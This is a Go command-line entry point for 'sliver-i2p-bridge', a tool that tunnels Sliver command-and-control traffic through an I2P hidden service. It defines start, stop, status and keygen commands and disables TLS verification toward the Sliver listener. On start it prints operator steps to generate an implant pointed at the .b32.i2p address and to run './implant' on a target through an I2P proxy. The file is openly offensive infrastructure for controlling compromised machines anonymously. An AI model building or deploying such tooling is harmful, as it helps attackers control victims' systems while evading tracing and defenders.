package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"sliver-i2p-bridge/internal/bridge"
	"sliver-i2p-bridge/internal/config"

	"github.com/spf13/cobra"
)

// Version info - set at build time via ldflags
var (
	version   = "dev"
	buildTime = "unknown"
	gitCommit = "unknown"
)

var (
	cfgFile     string
	sliverHost  string
	sliverPort  int
	samHost     string
	samPort     int
	persistKeys bool
	keyPath     string
)

func main() {
	rootCmd := &cobra.Command{
		Use:   "sliver-i2p-bridge",
		Short: "I2P transport bridge for Sliver C2",
		Long: `Creates an I2P hidden service that forwards traffic to Sliver's HTTPS listener.
Implants connect through I2P, you control them through Sliver normally.

  sliver server <---> bridge <---> I2P network <---> implant
       :8443        SAM:7656      xyz.b32.i2p      (via I2P)`,
	}

	versionCmd := &cobra.Command{
		Use:   "version",
		Short: "Print version information",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Printf("sliver-i2p-bridge %s\n", version)
			fmt.Printf("  Build time: %s\n", buildTime)
			fmt.Printf("  Git commit: %s\n", gitCommit)
		},
	}

	startCmd := &cobra.Command{
		Use:   "start",
		Short: "Start the I2P bridge",
		Run:   runStart,
	}

	stopCmd := &cobra.Command{
		Use:   "stop",
		Short: "Stop the I2P bridge and cleanup",
		Run:   runStop,
	}

	statusCmd := &cobra.Command{
		Use:   "status",
		Short: "Check bridge and I2P session status",
		Run:   runStatus,
	}

	keygenCmd := &cobra.Command{
		Use:   "keygen",
		Short: "Generate persistent I2P destination keys",
		Run:   runKeygen,
	}

	// Global flags
	rootCmd.PersistentFlags().StringVar(&cfgFile, "config", "", "config file path")

	// Start command flags
	startCmd.Flags().StringVar(&sliverHost, "sliver-host", "127.0.0.1", "Sliver HTTPS listener host")
	startCmd.Flags().IntVar(&sliverPort, "sliver-port", 8443, "Sliver HTTPS listener port")
	startCmd.Flags().StringVar(&samHost, "sam-host", "127.0.0.1", "I2P SAM bridge host")
	startCmd.Flags().IntVar(&samPort, "sam-port", 7656, "I2P SAM bridge port")
	startCmd.Flags().BoolVar(&persistKeys, "persist-keys", true, "Use persistent destination keys (recommended for production)")
	startCmd.Flags().StringVar(&keyPath, "key-path", "destination.keys", "Path to destination key file")

	// Keygen flags
	keygenCmd.Flags().StringVar(&keyPath, "output", "destination.keys", "Output path for generated keys")

	rootCmd.AddCommand(startCmd, stopCmd, statusCmd, keygenCmd, versionCmd)

	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func runStart(cmd *cobra.Command, args []string) {
	cfg := &config.Config{
		SliverHost:    sliverHost,
		SliverPort:    sliverPort,
		SAMHost:       samHost,
		SAMPort:       samPort,
		PersistKeys:   persistKeys,
		KeyPath:       keyPath,
		SkipTLSVerify: true, // Sliver uses self-signed certs
	}

	fmt.Println("[*] sliver-i2p-bridge starting...")
	fmt.Printf("[*] Sliver target: %s:%d\n", cfg.SliverHost, cfg.SliverPort)
	fmt.Printf("[*] SAM bridge: %s:%d\n", cfg.SAMHost, cfg.SAMPort)

	b, err := bridge.New(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Failed to create bridge: %v\n", err)
		os.Exit(1)
	}

	// Start the bridge
	if err := b.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "[!] Failed to start bridge: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] I2P session established!")
	fmt.Printf("[+] Destination: %s\n", b.GetDestination())
	fmt.Printf("[+] B32 Address: %s.b32.i2p\n", b.GetB32Address())
	fmt.Println("[+] Bridge is READY!")
	fmt.Println("")
	fmt.Println("[*] Generate implant with:")
	fmt.Printf("    sliver > generate --http http://%s.b32.i2p --os <target_os>\n", b.GetB32Address())
	fmt.Println("")
	fmt.Println("[*] On target (with I2P HTTP proxy):")
	fmt.Println("    HTTP_PROXY=http://127.0.0.1:4444 ./implant")

	// Wait for interrupt
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	fmt.Println("\n[*] Shutting down...")
	b.Stop()
	fmt.Println("[+] Bridge stopped.")
}

func runStop(cmd *cobra.Command, args []string) {
	fmt.Println("[*] Sending stop signal to bridge...")
	// In a real implementation, this would communicate with a running instance
	// For now, we rely on SIGTERM
	fmt.Println("[+] Use Ctrl+C on the running bridge or kill the process.")
}

func runStatus(cmd *cobra.Command, args []string) {
	fmt.Println("[*] Checking I2P SAM bridge status...")
	
	cfg := &config.Config{
		SAMHost: samHost,
		SAMPort: samPort,
	}

	status, err := bridge.CheckStatus(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Status check failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] SAM Bridge: %s\n", status.SAMStatus)
	if status.SessionActive {
		fmt.Printf("[+] Session: ACTIVE\n")
		fmt.Printf("[+] Destination: %s\n", status.Destination)
	} else {
		fmt.Println("[-] Session: INACTIVE")
	}
}

func runKeygen(cmd *cobra.Command, args []string) {
	fmt.Printf("[*] Generating I2P destination keys to %s...\n", keyPath)
	
	cfg := &config.Config{
		SAMHost: samHost,
		SAMPort: samPort,
		KeyPath: keyPath,
	}

	dest, err := bridge.GenerateKeys(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Key generation failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Keys saved to: %s\n", keyPath)
	fmt.Printf("[+] B32 Address: %s.b32.i2p\n", dest)
	fmt.Println("[*] Use --persist-keys --key-path to use these keys.")
}
